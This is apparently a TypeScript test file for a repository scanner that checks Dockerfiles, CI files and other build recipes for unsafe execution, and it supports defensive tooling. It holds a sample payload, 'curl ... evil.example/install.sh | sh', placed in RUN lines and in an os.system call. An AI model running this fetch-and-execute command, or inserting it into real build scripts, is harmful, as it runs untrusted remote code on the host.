import { expect, test } from "bun:test";
import { inspectRepository, surfacesOf } from "./bounded-scan";

/** One unambiguous unsafe-execution payload, independent of the file name. */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";

function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

test("a container or CI build recipe is scanned as an install surface", () => {
  // PRD section 8: the scan checks install and build scripts. A build recipe
  // runs commands at build, install or provision time whatever its name is.
  for (const path of [
    "Dockerfile",
    "Dockerfile.prod",
    "build/Dockerfile.release",
    "app.dockerfile",
    "Containerfile",
    "ci/Jenkinsfile",
    "CMakeLists.txt",
    "cmake/Modules/Helper.cmake",
    "meson.build",
    "Earthfile",
    "SConstruct",
    "wscript",
    "Makefile.am",
  ]) {
    const inspection = inspected(path, `RUN ${PAYLOAD}\n`);
    expect({ path, surfaces: surfacesOf(path) }).toEqual({
      path,
      surfaces: ["installScripts", "source"],
    });
    expect({ path, coverage: inspection.coverage.installScripts }).toEqual({
      path,
      coverage: { state: "complete", items: 1 },
    });
    expect({
      path,
      findings: inspection.findings.map(
        (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
      ),
    }).toEqual({ path, findings: [`${path}:unsafe-execution:high`] });
  }
});

test("changing a build recipe changes the reviewed inventory and reuse key", () => {
  const before = inspected("Dockerfile", "FROM node:24-slim\n");
  const after = inspected("Dockerfile", "FROM node:24-slim\nUSER nobody\n");
  expect(Buffer.compare(before.inventory, after.inventory) === 0).toBe(false);
  expect(before.inventorySha256 === after.inventorySha256).toBe(false);
});

test("a referenced SCons child script is scanned and changes the reuse key", () => {
  const scan = (child: string) =>
    inspectRepository({
      files: [
        {
          path: "SConstruct",
          bytes: new TextEncoder().encode("SConscript('src/SConscript')\n"),
        },
        { path: "src/SConscript", bytes: new TextEncoder().encode(child) },
      ],
    });
  const before = scan("Program('hello.c')\n");
  const after = scan(`import os\nos.system('${PAYLOAD}')\n`);
  expect(after.coverage.installScripts).toEqual({
    state: "complete",
    items: 2,
  });
  expect(after.findings).toContainEqual(
    expect.objectContaining({
      path: "src/SConscript",
      category: "unsafe-execution",
      severity: "high",
    }),
  );
  expect(after.inventorySha256).not.toBe(before.inventorySha256);
});

test("the executable surface stays bounded", () => {
  // Only build recipes are added: unrelated extensionless files keep no
  // surface, so the inventory does not become a blanket text scan.
  expect(surfacesOf("LICENSE")).toEqual([]);
  expect(surfacesOf("NOTICE")).toEqual([]);
});
